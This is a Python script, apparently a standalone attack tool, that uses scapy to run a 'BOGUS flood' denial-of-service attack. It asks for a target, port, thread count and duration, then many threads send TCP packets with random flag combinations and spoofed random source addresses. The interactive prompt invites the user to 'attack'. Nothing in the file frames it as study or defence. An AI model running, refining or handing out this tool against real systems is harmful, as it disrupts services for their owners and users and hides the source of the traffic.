from scapy.all import *
from colorama import Fore
import time, threading, sys, random, string

_abort = False

def _bogus(_ip, _prt):
    _flags = ['S','A','P','U','F','R','E','C']
    while _abort == False:
        try:
            # choose random flag/s to send
            flag = ''
            max = random.randint(1, len(_flags))
            while max != 0:
                new = random.choice(_flags)
                if not new in flag:
                    flag = flag + new
                    max -=1
                    
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = _ip

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(_prt)
            TCP_Packet.flags = flag
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass
            
def _rslv(_host):
    from urllib.parse import urlparse
    try:
        xhost = _host.lower()
        if not (xhost.startswith("http://") or xhost.startswith("https://")):
            xhost = "http://" + xhost
         
        _domain = urlparse(xhost).netloc
        _eip = socket.gethostbyname(_domain)
        return _eip
    except:
        sys.exit()

def main():
    global _abort
    try:
        arg1 = input('\r\n\033[1m \033[34mIP/URL: \033[31m')
        arg1 = _rslv(arg1)
        arg2 = input(' \033[34mPORT: \033[31m')
        _thdz = input(' \033[34mTHREAD/S: \033[31m')
        _time = input(' \033[34mSECONDS: \033[31m')
    except KeyboardInterrupt:
        sys.exit()
    
    z = input('\r\n\033[37m Ready? Strike <ENTER> to attack and <CTRL+C> to quit...')
    
    print('\r\n\r\n ---> BOGUS flood sent to ' + arg1 + ' for ' + _time + ' seconds!')
    tasks = []
    for x in range(0, int(_thdz)):
        x = threading.Thread(target=_bogus, args=(arg1, arg2))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(_time)
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit()
    
if __name__ == "__main__":
    main()
